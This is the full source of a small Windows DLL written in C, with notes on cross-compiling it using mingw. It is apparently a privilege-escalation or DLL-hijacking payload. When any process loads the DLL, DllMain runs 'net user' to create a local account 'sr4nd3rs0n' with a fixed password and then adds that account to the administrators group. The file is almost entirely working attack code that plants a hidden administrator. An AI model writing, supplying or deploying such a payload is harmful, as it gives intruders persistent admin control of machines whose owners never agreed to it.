#include <stdlib.h>
#include <windows.h>

// Compiling: x86_64-w64-mingw32-gcc <filecode>.cpp --shared -o <filename>.dll
// Troubleshooting: It is recommended to install it first if it appears errors using the command: sudo apt-get install mingw-w64. 
// If there is any problem with the installation: sudo apt-get update; sudo apt-get install --reinstall build-essential.

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user sr4nd3rs0n password123! /add");
  	    i = system ("net localgroup administrators sr4nd3rs0n /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
